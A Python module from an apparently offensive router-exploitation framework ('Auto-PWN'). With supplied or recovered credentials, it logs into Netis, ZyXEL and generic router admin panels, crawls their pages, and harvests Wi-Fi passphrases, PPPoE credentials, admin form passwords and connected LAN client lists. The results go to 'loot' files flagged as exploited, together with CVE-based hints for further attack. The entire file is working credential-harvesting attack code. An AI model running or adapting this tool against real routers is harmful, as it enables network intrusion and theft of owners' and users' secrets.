"""
Deep harvest on an already-authenticated router web session.

Use when the operator provides http://user:pass@ip/ — crawls admin pages,
extracts device info, Wi-Fi, DHCP/ARP clients, WAN/PPPoE secrets, and CVE hints.
"""

from __future__ import annotations

import json
import os
import re
from html import unescape
from typing import Any
from urllib.parse import urljoin, urlparse

import requests

from core.target_auth import auth_from_hints, parse_target_auth
from engines.credential_hunter import _netis_login_url
from engines.device_cve_checker import assess_device, print_cve_report
from engines.fingerprinter import Fingerprinter
from engines.loot_report import LootEntry, LootReport
from engines.utils import extract_credentials, extract_ip, log, save_success

# --- Page lists per vendor ---
NETIS_PATHS: tuple[str, ...] = (
    "index.htm",
    "status.htm",
    "status_inter.htm",
    "status_stat.htm",
    "wan.htm",
    "adsl.htm",
    "adsl_status.htm",
    "wireless.htm",
    "wl_basic.htm",
    "wl_security.htm",
    "wl_ad.htm",
    "wl_filter.htm",
    "wlan.htm",
    "lan.htm",
    "dhcp.htm",
    "dhcp_clients.htm",
    "arp.htm",
    "route.htm",
    "nat.htm",
    "dmz.htm",
    "filter.htm",
    "user.htm",
    "passwd.htm",
    "password.htm",
    "syslog.htm",
    "time.htm",
    "qos.htm",
    "maintenance.htm",
    "backup.htm",
    "stat.htm",
    "statistics.htm",
    "deviceinfo.htm",
)

ZYXEL_PATHS: tuple[str, ...] = (
    "Forms/Status_1",
    "Forms/Status_WAN_1",
    "Forms/Status_LAN_1",
    "Forms/General_1",
    "Forms/WLAN_General_1",
    "Forms/WLAN_Security_1",
    "Forms/DHCPClientsTable_1",
    "Forms/ARPTable_1",
    "Forms/Route_1",
    "Forms/NAT_1",
    "Forms/Firewall_1",
    "Forms/Maintenance_1",
    "Forms/Backup_1",
    "Forms/UserAccount_1",
    "Forms/ADSL_Status_1",
    "Forms/Device_Info_1",
)

GENERIC_PATHS: tuple[str, ...] = (
    "status.htm",
    "wan.htm",
    "wireless.htm",
    "wlan.htm",
    "dhcp.htm",
    "dhcp_clients.htm",
    "lan.htm",
    "arp.htm",
    "deviceinfo.htm",
    "maintenance.htm",
    "cgi-bin/luci/admin/status/overview",
    "cgi-bin/luci/admin/network/dhcp",
    "cgi-bin/luci/admin/network/wireless",
)

# English menu labels (ZyXEL / rebranded Netis SPA)
UI_MENU_HTM: tuple[str, ...] = (
    "Device_info.htm",
    "device_info.htm",
    "Statistics.htm",
    "statistics.htm",
    "Maintenance.htm",
    "Firewall.htm",
    "Service.htm",
    "Advanced.htm",
    "Setup.htm",
    "Quick_Start.htm",
    "ADSL.htm",
    "lan_clients.htm",
    "client_list.htm",
    "wl_ad.htm",
)

JUNK_FIELD_RE = re.compile(
    r"\$\{|javascript|void\s*\(|submit\.htm|display\s*:|table-layout|word-wrap|"
    r"^\s*GMT|GMT-\d|rel=|class=|refresh\s*:|connect_chg|phyType|autoDroute|"
    r"pppConnect|pppDisconnect|^\s*(add|modify|delvc|reset|select)\s*$",
    re.I,
)

MENU_KEYWORDS = re.compile(
    r"(device_info|deviceinfo|status|statistics|wireless|wlan|dhcp|lan|wan|"
    r"firewall|maintenance|backup|adsl|ppp|user|password|client|arp|nat|dmz|"
    r"forms/|goform)",
    re.I,
)
IP_RE = re.compile(r"\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b")
MAC_RE = re.compile(r"\b([0-9a-f]{2}(?::[0-9a-f]{2}){5})\b", re.I)
PRIVATE_IP_RE = re.compile(
    r"^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.)"
)
JUNK_VALUES = frozenset(
    {"type", "text", "password", "button", "submit", "on", "off", "enable", "disable", ""}
)
SSID_INPUT = re.compile(r"ssid|wlan_ssid|wl_ssid|wifi_ssid|network_name", re.I)
KEY_INPUT = re.compile(r"psk|wpa|wep|passphrase|wifi_key|wlan_key|security_key|wpapsk", re.I)
PASS_INPUT = re.compile(
    r"pass|pwd|psk|pppoe|wpa|wep|key|secret|pin", re.I
)


def _session() -> requests.Session:
    s = requests.Session()
    s.verify = False
    s.headers["User-Agent"] = "Mozilla/5.0 Auto-PWN-RouterHarvest/1.0"
    return s


def _load_hints(target_dir: str) -> dict:
    path = os.path.join(target_dir, "target_hints.json")
    if not os.path.isfile(path):
        return {}
    try:
        with open(path, "r", encoding="utf-8") as fh:
            return json.load(fh)
    except (OSError, json.JSONDecodeError):
        return {}


def resolve_auth(
    raw_target: str,
    target_dir: str,
    username: str | None = None,
    password: str | None = None,
) -> dict[str, Any]:
    auth = parse_target_auth(raw_target)
    if auth:
        return auth
    hints = _load_hints(target_dir)
    hint_pair = auth_from_hints(hints)
    host = hints.get("host") or extract_ip(raw_target) or raw_target.strip()
    port = int(hints.get("port") or 80)
    scheme = hints.get("scheme") or "http"
    user = username
    pwd = password or ""
    if hint_pair:
        user, pwd = hint_pair
    if not user:
        u, p = extract_credentials(raw_target)
        if u:
            user, pwd = u, p or ""
    if not user:
        raise ValueError(
            "No credentials — use http://user:pass@IP/ in the target bar or pass username/password."
        )
    if port in (80, 443):
        netloc = host
    else:
        netloc = f"{host}:{port}"
    base = f"{scheme}://{netloc}"
    return {
        "username": user,
        "password": pwd,
        "scheme": scheme,
        "host": host,
        "port": port,
        "path": "/",
        "base_url": base,
        "authenticated_url": f"{scheme}://{user}:{pwd}@{netloc}/",
    }


def establish_session(conn: dict[str, Any]) -> tuple[requests.Session, str]:
    base = conn["base_url"]
    user = conn["username"]
    password = conn["password"]
    session = _session()
    session.headers["Referer"] = f"{base}/index.htm"

    if _netis_login_url(base):
        session.post(
            f"{base}/login.cgi",
            data={
                "username": user,
                "password": password,
                "submit.htm?login.htm": "Send",
            },
            timeout=12,
        )
        probe = session.get(f"{base}/index.htm", timeout=10)
        body = probe.text.lower()
        if probe.status_code == 200 and (
            "login.htm" not in body[:2000] or "logout" in body or "wireless" in body
        ):
            if "error" not in body[:1500] and "alert" not in body[:1500]:
                return session, "Netis form (login.cgi)"

    session.auth = (user, password)
    try:
        r = session.get(base + "/", timeout=10)
        text = r.text.lower()
        if r.status_code == 200 and not ('name="password"' in text[:3000] and "logout" not in text):
            if any(x in text for x in ("logout", "device_info", "wireless", "dhcp", "status", "wan")):
                return session, "HTTP Basic/Digest"
    except requests.RequestException:
        pass

    session.auth = None
    r = session.get(base + "/", auth=(user, password), timeout=10)
    text = r.text.lower()
    if r.status_code == 200 and any(
        x in text for x in ("logout", "sign out", "device_info", "wireless", "dhcp", "statistics")
    ):
        return session, "HTTP auth (explicit)"

    raise RuntimeError(
        f"Could not verify login for {user}@{conn['host']} — check URL/credentials."
    )


def _vendor_paths(device_type: str, server: str, html_sample: str) -> list[str]:
    low = (html_sample or "").lower()
    server_low = (server or "").lower()
    paths: list[str] = []
    seen: set[str] = set()

    def add_many(items: tuple[str, ...] | list[str]) -> None:
        for p in items:
            if p not in seen:
                seen.add(p)
                paths.append(p)

    # Virtual Web = ZyXEL stack; often still uses Netis login.cgi + .htm pages
    if "virtual web" in server_low or "zyxel" in low:
        add_many(ZYXEL_PATHS)
        add_many(NETIS_PATHS)
        add_many(UI_MENU_HTM)
        add_many(GENERIC_PATHS)
        return paths

    if device_type == "NETIS" or "netis" in low or "login.cgi" in low:
        add_many(NETIS_PATHS)
        add_many(UI_MENU_HTM)
        return paths

    add_many(GENERIC_PATHS)
    add_many(NETIS_PATHS)
    return paths


def _discover_htm_from_html(html: str) -> list[str]:
    """Pull every *.htm referenced in JS/HTML (SPA menus)."""
    found: list[str] = []
    for m in re.finditer(r"""['"]([a-zA-Z0-9_./-]+\.htm(?:\?[^'"]*)?)['"]""", html, re.I):
        name = m.group(1).split("?")[0]
        if name not in found and "login" not in name.lower():
            found.append(name)
    for m in re.finditer(r"""sub:\s*['"]([^'"]+)['"]""", html, re.I):
        sub = m.group(1)
        if sub.endswith(".htm") and sub not in found:
            found.append(sub)
    return found


def _is_meaningful_field(key: str, val: str) -> bool:
    k, v = key.strip(), val.strip()
    if not k or not v or v.lower() in JUNK_VALUES:
        return False
    if JUNK_FIELD_RE.search(k) or JUNK_FIELD_RE.search(v):
        return False
    if "${" in k or "${" in v or "item." in k:
        return False
    if len(k) > 55 or len(v) > 220:
        return False
    if re.match(r"^\d{1,2}/\d{1,2}$", v):  # 0/35 interface counters as lone value
        return len(k) > 3 and not re.match(r"^WAN\d+$", k, re.I)
    return True


def _discover_embedded_urls(base: str, html: str) -> list[str]:
    found: list[str] = []
    patterns = (
        r"""<frame[^>]+src=["']([^"']+)["']""",
        r"""<iframe[^>]+src=["']([^"']+)["']""",
        r"""href\s*=\s*['"]([^'"]+\.(?:htm|html|asp|cgi)[^'"]*)['"]""",
        r"""['"]([a-zA-Z0-9_./-]+\.(?:htm|html|asp|cgi)(?:\?[^'"]*)?)['"]""",
        r"""(?:location|href)\s*=\s*['"]([^'"]+\.htm[^'"]*)['"]""",
    )
    base_p = urlparse(base)
    for pat in patterns:
        for m in re.finditer(pat, html, re.I):
            href = unescape(m.group(1).strip())
            if not href or href.startswith(("#", "javascript:", "mailto:")):
                continue
            full = urljoin(base + "/", href)
            parsed = urlparse(full)
            if parsed.hostname and parsed.hostname != base_p.hostname:
                continue
            if full not in found:
                found.append(full)
    return found


def _discover_hrefs(base: str, html: str) -> list[str]:
    found = _discover_embedded_urls(base, html)
    for m in re.finditer(r"""href\s*=\s*['"]([^'"]+)['"]""", html, re.I):
        href = unescape(m.group(1).strip())
        if not href or href.startswith(("#", "javascript:", "mailto:")):
            continue
        full = urljoin(base + "/", href)
        parsed = urlparse(full)
        base_p = urlparse(base)
        if parsed.hostname and parsed.hostname != base_p.hostname:
            continue
        path = parsed.path or "/"
        if not MENU_KEYWORDS.search(path) and not path.endswith(
            (".htm", ".html", ".asp", ".cgi", ".php")
        ):
            continue
        if full not in found:
            found.append(full)
    return found[:60]


def _parse_input_fields(html: str) -> list[dict[str, str]]:
    rows: list[dict[str, str]] = []
    for m in re.finditer(r"<input([^>]+)>", html, re.I):
        tag = m.group(1)
        name_m = re.search(r'name=["\']([^"\']+)["\']', tag, re.I)
        if not name_m:
            continue
        name = name_m.group(1)
        val_m = re.search(r'value=["\']([^"\']*)["\']', tag, re.I)
        typ_m = re.search(r'type=["\']([^"\']+)["\']', tag, re.I)
        val = unescape(val_m.group(1)).strip() if val_m else ""
        typ = (typ_m.group(1).lower() if typ_m else "text")
        rows.append({"name": name, "value": val, "type": typ})
    for m in re.finditer(
        r"<textarea[^>]+name=['\"]([^'\"]+)['\"][^>]*>([^<]*)</textarea>",
        html,
        re.I | re.S,
    ):
        rows.append({"name": m.group(1), "value": unescape(m.group(2)).strip(), "type": "textarea"})
    return rows


def _extract_wireless(html: str) -> tuple[str, str]:
    ssid, key = "", ""
    for field in _parse_input_fields(html):
        name, val, typ = field["name"], field["value"], field["type"]
        if not val or val.lower() in JUNK_VALUES or len(val) < 2:
            continue
        if SSID_INPUT.search(name):
            if len(val) >= 2 and not val.startswith("type"):
                ssid = ssid or val
        if KEY_INPUT.search(name) or (typ == "password" and "wlan" in name.lower()):
            if len(val) >= 4:
                key = key or val
    for m in re.finditer(r'(?:ssid|SSID)\s*[=:]\s*["\']([^"\']{2,32})["\']', html):
        ssid = ssid or m.group(1)
    for m in re.finditer(
        r'(?:wpapsk|wpa_key|psk|passphrase)\s*[=:]\s*["\']([^"\']{4,64})["\']',
        html,
        re.I,
    ):
        key = key or m.group(1)
    return ssid, key


def _extract_secrets_from_inputs(html: str, page: str) -> list[dict[str, str]]:
    secrets: list[dict[str, str]] = []
    for field in _parse_input_fields(html):
        name, val, typ = field["name"], field["value"], field["type"]
        if not val or val.lower() in JUNK_VALUES:
            continue
        if typ == "password" or PASS_INPUT.search(name):
            if len(val) >= 2 and val.lower() not in JUNK_VALUES:
                secrets.append({"page": page, "field": name, "value": val, "type": typ})
    return secrets


def _extract_key_values(html: str) -> dict[str, str]:
    fields: dict[str, str] = {}
    kv_re = re.compile(
        r"(?:<td[^>]*>\s*)?([A-Za-z][\w\s./\-]{2,50})(?:</td>)?\s*"
        r"(?:<td[^>]*>|:)\s*([^<\n\r]{1,200})",
        re.I,
    )
    for m in kv_re.finditer(html):
        key = re.sub(r"\s+", " ", m.group(1)).strip()
        val = re.sub(r"\s+", " ", unescape(m.group(2))).strip()
        if not _is_meaningful_field(key, val):
            continue
        fields[key] = val[:300]
    for field in _parse_input_fields(html):
        name, val = field["name"], field["value"]
        if val and _is_meaningful_field(name, val):
            fields.setdefault(name, val[:300])
    return fields


def _extract_wan_status(html: str) -> dict[str, str]:
    """Structured WAN/uptime from status.htm / wan.htm (Netis/ZyXEL)."""
    info: dict[str, str] = {}
    for m in re.finditer(r"\b(up\s+\d+\s+day[^<\n]{0,40})", html, re.I):
        info["link_uptime"] = m.group(1).strip()
    for m in re.finditer(r"\b(day\s+\d+:\s*\d+:\s*\d+)", html, re.I):
        info["system_uptime"] = m.group(1).strip()
    m = re.search(r"PPPoE[:\s]*(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", html, re.I)
    if m:
        info["wan_ipv4"] = m.group(1)
    m = re.search(r"(?:LLC|encap|Encapsulation)[:\s]*([A-Za-z0-9]+)", html, re.I)
    if m:
        info["wan_encap"] = m.group(1)
    for m in re.finditer(r"\b(fe80:[0-9a-f:]+)", html, re.I):
        info.setdefault("wan_ipv6_link_local", m.group(1))
    for m in re.finditer(MAC_RE, html):
        mac = m.group(1).lower()
        if mac.startswith("04:8d:38") or "wan" in html[:500].lower():
            info.setdefault("wan_mac", mac)
            break
    return info


def _is_lan_client_entry(entry: dict[str, str], page: str) -> bool:
    ip = entry.get("ip", "")
    if ip and PRIVATE_IP_RE.match(ip):
        return True
    pl = page.lower()
    if entry.get("mac") and any(x in pl for x in ("dhcp", "arp", "client", "wlan", "assoc", "statistic")):
        return True
    return False


def _is_router_ip(ip: str, router_public: str, gateway: str | None) -> bool:
    if ip == router_public:
        return True
    if gateway and ip == gateway:
        return True
    if ip.startswith(("127.", "0.", "255.")):
        return True
    if ip.endswith(".255"):
        return True
    return False


def _extract_clients(
    html: str,
    *,
    router_public: str,
    gateway: str | None = None,
    page: str = "",
) -> list[dict[str, str]]:
    clients: list[dict[str, str]] = []
    seen_mac: set[str] = set()
    seen_ip: set[str] = set()

    for row in re.findall(r"<tr[^>]*>(.*?)</tr>", html, re.I | re.S):
        ips = IP_RE.findall(row)
        macs = [m.lower() for m in MAC_RE.findall(row)]
        if not ips and not macs:
            continue
        priv_ips = [ip for ip in ips if PRIVATE_IP_RE.match(ip)]
        if macs:
            for mac in macs:
                if mac in seen_mac:
                    continue
                ip = priv_ips[0] if priv_ips else ""
                if ip and _is_router_ip(ip, router_public, gateway):
                    if len(priv_ips) > 1:
                        ip = next((x for x in priv_ips if not _is_router_ip(x, router_public, gateway)), "")
                    else:
                        ip = ""
                if ip and ip in seen_ip:
                    continue
                entry: dict[str, str] = {"mac": mac, "source_page": page}
                if ip:
                    entry["ip"] = ip
                    seen_ip.add(ip)
                seen_mac.add(mac)
                tds = re.findall(r"<td[^>]*>([^<]+)</td>", row, re.I)
                for td in tds:
                    t = td.strip()
                    if t and not IP_RE.match(t) and not MAC_RE.match(t) and len(t) > 1:
                        entry.setdefault("hostname", t)
                        break
                clients.append(entry)
        elif priv_ips:
            for ip in priv_ips:
                if _is_router_ip(ip, router_public, gateway) or ip in seen_ip:
                    continue
                seen_ip.add(ip)
                clients.append({"ip": ip, "source_page": page})

    # Standalone MAC lines (some firmware)
    if "arp" in page.lower() or "dhcp" in page.lower() or "client" in page.lower():
        for m in re.finditer(
            r"([0-9a-f]{2}(?::[0-9a-f]{2}){5})\s*(?:[^<\d]{0,40})?\s*(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})",
            html,
            re.I,
        ):
            mac, ip = m.group(1).lower(), m.group(2)
            if mac in seen_mac or _is_router_ip(ip, router_public, gateway):
                continue
            if not PRIVATE_IP_RE.match(ip):
                continue
            seen_mac.add(mac)
            seen_ip.add(ip)
            clients.append({"ip": ip, "mac": mac, "source_page": page})

    # Drop interface-only MACs (WAN, no LAN IP) unless from client tables
    filtered: list[dict[str, str]] = []
    for c in clients:
        if c.get("ip"):
            filtered.append(c)
        elif c.get("mac") and _is_lan_client_entry(c, page):
            filtered.append(c)
        elif c.get("mac"):
            c["role"] = "interface"
            filtered.append(c)
    return filtered


def _merge_clients(existing: list[dict[str, str]], new: list[dict[str, str]]) -> None:
    by_mac = {c.get("mac", "").lower(): c for c in existing if c.get("mac")}
    by_ip = {c.get("ip", ""): c for c in existing if c.get("ip")}
    for c in new:
        mac = c.get("mac", "").lower()
        ip = c.get("ip", "")
        if mac and mac in by_mac:
            by_mac[mac].update({k: v for k, v in c.items() if v})
            continue
        if ip and ip in by_ip:
            by_ip[ip].update({k: v for k, v in c.items() if v})
            continue
        existing.append(c)
        if mac:
            by_mac[mac] = c
        if ip:
            by_ip[ip] = c


def _guess_gateway(html_pages: dict[str, str], default: str = "192.168.1.1") -> str:
    for text in html_pages.values():
        m = re.search(r"(?:gateway|default gateway|lan ip)[^0-9]*(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", text, re.I)
        if m:
            return m.group(1)
    return default


def _fetch_page(session: requests.Session, url: str) -> tuple[str, int]:
    try:
        r = session.get(url, timeout=14, allow_redirects=True)
        return r.text, r.status_code
    except requests.RequestException as exc:
        return f"<!-- error: {exc} -->", 0


def _safe_page_path(pages_dir: str, url: str) -> str:
    path = urlparse(url).path.strip("/").replace("/", "_") or "root"
    safe = re.sub(r"[^\w.\-]+", "_", path)[:100]
    return os.path.join(pages_dir, f"{safe}.html")


def run_router_harvest(
    target_dir: str,
    raw_target: str = "",
    *,
    username: str | None = None,
    password: str | None = None,
    max_pages: int = 90,
) -> dict[str, Any]:
    os.makedirs(target_dir, exist_ok=True)
    conn = resolve_auth(raw_target, target_dir, username, password)
    ip = conn["host"]
    log(f"Router harvest: {conn['username']}@{ip} (workspace {target_dir})", "SUCCESS")

    session, auth_method = establish_session(conn)
    base = conn["base_url"]
    # ZyXEL Forms/* often need HTTP auth alongside Netis cookie session
    session.auth = (conn["username"], conn["password"])

    fp = Fingerprinter(conn.get("authenticated_url") or base)
    fp_info = fp.identify_details()
    device_type = fp_info.get("device_type", "UNKNOWN")
    model = fp_info.get("model", "")
    server = fp_info.get("server", "")

    index_html, _ = _fetch_page(session, urljoin(base + "/", "index.htm"))
    vendor_paths = _vendor_paths(device_type, server, index_html)
    is_zyxel_web = "virtual web" in (server or "").lower()

    pages_dir = os.path.join(target_dir, "router_harvest_pages")
    os.makedirs(pages_dir, exist_ok=True)
    fetch_failures: list[str] = []

    to_visit: list[str] = []
    for rel in vendor_paths:
        to_visit.append(urljoin(base + "/", rel))
    for u in _discover_embedded_urls(base, index_html):
        if u not in to_visit:
            to_visit.append(u)
    for htm in _discover_htm_from_html(index_html):
        u = urljoin(base + "/", htm)
        if u not in to_visit:
            to_visit.append(u)

    visited: set[str] = set()
    page_store: dict[str, dict[str, Any]] = {}
    raw_html_by_path: dict[str, str] = {}
    all_fields: dict[str, str] = {}
    wan_status: dict[str, str] = {}
    router_interfaces: list[dict[str, str]] = []
    all_clients: list[dict[str, str]] = []
    all_secrets: list[dict[str, str]] = []
    wireless_ssid, wireless_key = "", ""
    gateway: str | None = None

    def _harvest_page(url: str) -> None:
        nonlocal gateway, wireless_ssid, wireless_key, wan_status
        norm = url.split("?", 1)[0]
        if norm in visited:
            return
        visited.add(norm)
        html, status = _fetch_page(session, url)
        rel = urlparse(norm).path or "/"
        if status not in (200, 206) or len(html) < 80:
            fetch_failures.append(f"{rel} -> HTTP {status} (len={len(html)})")
            return

        page_path = _safe_page_path(pages_dir, norm)
        with open(page_path, "w", encoding="utf-8", errors="ignore") as fh:
            fh.write(html)
        raw_html_by_path[rel] = html

        fields = _extract_key_values(html)
        for k, v in fields.items():
            all_fields.setdefault(k, v)

        wan_status.update(_extract_wan_status(html))

        if not gateway:
            gateway = _guess_gateway({rel: html})

        clients = _extract_clients(
            html,
            router_public=ip,
            gateway=gateway,
            page=rel,
        )
        for c in clients:
            if c.get("role") == "interface" or (c.get("mac") and not c.get("ip")):
                if rel in ("/status.htm", "/wan.htm") or "status" in rel.lower():
                    router_interfaces.append({**c, "source_page": rel})
                    continue
            if _is_lan_client_entry(c, rel):
                _merge_clients(all_clients, [c])

        ssid, key = _extract_wireless(html)
        if ssid and ssid.lower() not in JUNK_VALUES:
            wireless_ssid = wireless_ssid or ssid
        if key and key.lower() not in JUNK_VALUES and key != "type":
            wireless_key = wireless_key or key

        for sec in _extract_secrets_from_inputs(html, rel):
            if IP_RE.fullmatch(sec.get("value", "").strip()):
                continue
            if not any(
                s.get("field") == sec["field"] and s.get("value") == sec["value"]
                for s in all_secrets
            ):
                all_secrets.append(sec)

        page_store[norm] = {
            "status": status,
            "file": page_path,
            "fields": fields,
            "clients": clients,
        }
        log(
            f"Harvested: {rel} ({len(fields)} fields, {len(clients)} rows)",
            "INFO",
        )

        for link in _discover_hrefs(base, html):
            link_norm = link.split("?", 1)[0]
            if link_norm not in visited and link not in to_visit:
                to_visit.append(link)
        for htm in _discover_htm_from_html(html):
            u = urljoin(base + "/", htm)
            if u.split("?", 1)[0] not in visited and u not in to_visit:
                to_visit.append(u)

    while to_visit and len(visited) < max_pages:
        _harvest_page(to_visit.pop(0))

    # Second wave: mine every .htm name seen in saved HTML
    if len(page_store) < 12:
        wave2: list[str] = []
        blob = "\n".join(raw_html_by_path.values())
        for htm in _discover_htm_from_html(blob):
            u = urljoin(base + "/", htm)
            if u.split("?", 1)[0] not in visited:
                wave2.append(u)
        log(f"Second crawl wave: {len(wave2)} .htm link(s) from saved HTML", "INFO")
        for u in wave2:
            if len(visited) >= max_pages:
                break
            _harvest_page(u)

    fail_path = os.path.join(target_dir, "ROUTER_HARVEST_FAILS.txt")
    with open(fail_path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(fetch_failures[:200]) or "(all seed URLs returned 200)")

    if not gateway:
        gateway = _guess_gateway(raw_html_by_path)

    # PPPoE credentials only (not WAN IP mislabeled as password)
    pppoe: dict[str, str] = {}
    for key, val in all_fields.items():
        kl = key.lower()
        if IP_RE.fullmatch(val.strip()):
            continue
        if ("ppp" in kl or "adsl" in kl) and (
            PASS_INPUT.search(kl) or "user" in kl or "name" in kl
        ):
            pppoe[key] = val
    if wan_status.get("wan_ipv4"):
        wan_status.setdefault("note", "wan_ipv4 is public IP, not a password")

    admin_passwords = [
        {"field": s["field"], "value": s["value"], "page": s["page"]}
        for s in all_secrets
        if "admin" in s["field"].lower() or s["type"] == "password"
    ]

    intel = assess_device(
        ip,
        conn["port"],
        device_type,
        model=model,
        server=server,
        auth=(conn["username"], conn["password"]),
    )

    credentials = [
        {
            "service": "router_web",
            "username": conn["username"],
            "password": conn["password"],
            "auth_method": auth_method,
        }
    ]
    if wireless_ssid or wireless_key:
        credentials.append(
            {"service": "wireless", "ssid": wireless_ssid, "password": wireless_key}
        )
    for s in all_secrets:
        if s["field"].lower() in ("password", "passwd", "pwd") and s["value"]:
            credentials.append(
                {"service": f"form:{s['page']}", "field": s["field"], "password": s["value"]}
            )

    summary: dict[str, Any] = {
        "host": ip,
        "port": conn["port"],
        "base_url": base,
        "authenticated_url": conn.get("authenticated_url"),
        "username": conn["username"],
        "password": conn["password"],
        "auth_method": auth_method,
        "device_type": device_type,
        "model": model,
        "server": server,
        "lan_gateway": gateway,
        "ui_stack": "ZyXEL Virtual Web + Netis login" if is_zyxel_web else device_type,
        "pages_fetched": len(page_store),
        "pages_attempted": len(visited),
        "fetch_failures_sample": fetch_failures[:30],
        "device_fields": all_fields,
        "wan_status": wan_status,
        "router_interfaces": router_interfaces,
        "connected_clients": all_clients,
        "wireless": {"ssid": wireless_ssid, "key": wireless_key},
        "secrets_in_html": [f"{s['page']}:{s['field']}={s['value']}" for s in all_secrets],
        "form_secrets": all_secrets,
        "admin_passwords": admin_passwords,
        "pppoe_wan": pppoe,
        "credentials": credentials,
        "cve_assessments": [
            {
                "cve_id": a.cve_id,
                "title": a.title,
                "severity": a.severity,
                "status": a.status,
                "reason": a.reason,
            }
            for a in intel.assessments
        ],
        "nuclei_templates": list(intel.nuclei_templates)[:30],
        "nuclei_tags": list(intel.nuclei_tags)[:20],
        "pages": {
            k: {"file": v["file"], "field_count": len(v["fields"]), "clients": len(v["clients"])}
            for k, v in page_store.items()
        },
        "harvest_note": (
            f"Fetched {len(page_store)}/{len(visited)} URLs. "
            f"LAN clients: {len(all_clients)}. "
            f"Failures logged: ROUTER_HARVEST_FAILS.txt. "
            "Guest often hides Wi‑Fi/DHCP — try admin. "
            "CVE netis-info-leak may expose Wi‑Fi password on some firmware."
        ),
    }

    json_path = os.path.join(target_dir, "ROUTER_HARVEST.json")
    with open(json_path, "w", encoding="utf-8") as fh:
        json.dump(summary, fh, indent=2, ensure_ascii=False)

    clients_path = os.path.join(target_dir, "ROUTER_LAN_CLIENTS.json")
    with open(clients_path, "w", encoding="utf-8") as fh:
        json.dump({"gateway": gateway, "clients": all_clients}, fh, indent=2, ensure_ascii=False)

    txt_lines = [
        "=" * 60,
        f"ROUTER HARVEST — {ip}",
        f"Login: {conn['username']}:{conn['password']} ({auth_method})",
        f"Device: {device_type} | {model} | Server: {server}",
        f"LAN gateway: {gateway or '—'}",
        f"UI: {'ZyXEL Virtual Web + Netis' if is_zyxel_web else device_type}",
        f"Pages saved: {len(page_store)} (tried {len(visited)}) → {pages_dir}",
        f"Failed URLs: see ROUTER_HARVEST_FAILS.txt ({len(fetch_failures)} lines)",
        "=" * 60,
        "",
        "— WAN / link status —",
    ]
    if wan_status:
        for k, v in wan_status.items():
            txt_lines.append(f"  {k}: {v}")
    else:
        txt_lines.append("  (see status.htm / wan.htm)")
    txt_lines.extend(["", "— CVE / risk —"])
    for a in intel.assessments:
        txt_lines.append(f"  {a.cve_id} [{a.severity}] {a.status}: {a.title}")
    txt_lines.extend(
        [
            "",
            "— Wireless (Wi‑Fi) —",
            f"  SSID : {wireless_ssid or '(hidden for guest — use admin or CVE netis-info-leak)'}",
            f"  Key  : {wireless_key or '(hidden for guest)'}",
            "",
            "— PPPoE credentials (not WAN IP) —",
        ]
    )
    if pppoe:
        for k, v in pppoe.items():
            txt_lines.append(f"  {k}: {v}")
    else:
        txt_lines.append("  (none — guest cannot read PPPoE password fields)")
    txt_lines.extend(["", "— Router interfaces (WAN MAC / IPv6) —"])
    if router_interfaces:
        for iface in router_interfaces:
            txt_lines.append(
                f"  mac={iface.get('mac', '—')} role={iface.get('role', 'wan')} src={iface.get('source_page')}"
            )
    else:
        txt_lines.append("  (see wan_status above)")
    txt_lines.extend(["", "— Passwords in admin forms —"])
    if all_secrets:
        for s in all_secrets[:25]:
            txt_lines.append(f"  [{s['page']}] {s['field']} = {s['value']}")
    else:
        txt_lines.append("  (none — guest may not see passwords; try admin account)")
    txt_lines.extend(["", "— LAN / DHCP / ARP clients —"])
    if all_clients:
        for c in all_clients:
            txt_lines.append(
                f"  ip={c.get('ip', '—'):<16} mac={c.get('mac', '—'):<18} "
                f"host={c.get('hostname', '—'):<20} src={c.get('source_page', '')}"
            )
    else:
        txt_lines.append(
            "  (none with MAC — open arp.htm / dhcp_clients.htm in saved pages; "
            "or run Nmap on LAN after harvest)"
        )
    txt_lines.extend(["", "— Device info (filtered) —"])
    if all_fields:
        for k, v in list(all_fields.items())[:40]:
            txt_lines.append(f"  {k}: {v}")
    else:
        txt_lines.append("  (SPA UI — open saved HTML or use admin account)")

    txt_path = os.path.join(target_dir, "ROUTER_HARVEST.txt")
    with open(txt_path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(txt_lines))

    with open(os.path.join(target_dir, "ROUTER_ACCESS.txt"), "w", encoding="utf-8") as fh:
        fh.write(
            f"{conn['username']}:{conn['password']}\n"
            f"url={conn.get('authenticated_url') or base}\n"
            f"method={auth_method}\n"
            f"gateway={gateway or ''}\n"
        )

    loot = LootReport(ip)
    loot.add(
        LootEntry(
            ip=ip,
            port=conn["port"],
            device_type=device_type,
            model=model,
            username=conn["username"],
            password=conn["password"],
            auth_method=auth_method,
            wireless_ssid=wireless_ssid,
            wireless_key=wireless_key,
        )
    )
    from dataclasses import asdict

    with open(os.path.join(target_dir, "ENGINE_LOOT.json"), "w", encoding="utf-8") as fh:
        json.dump(
            {
                "summary": {"exploited": True, "device_type": device_type},
                "loot": {
                    "entries": [asdict(e) for e in loot.entries],
                    "files": loot.files,
                    "notes": loot.notes + [summary.get("harvest_note", "")],
                },
            },
            fh,
            indent=2,
            ensure_ascii=False,
        )
    loot.print_final()
    save_success(ip, f"Router web ({conn['port']})", f"{conn['username']}:{conn['password']}")
    log(f"Router harvest saved: {txt_path}", "SUCCESS")
    print_cve_report(intel)

    from core.workflow_recommendations import emit_post_tool_recommendations

    emit_post_tool_recommendations(
        target_dir,
        ip,
        finished_tool="router-harvest",
        exploited=True,
        job_kind="custom",
    )
    return summary
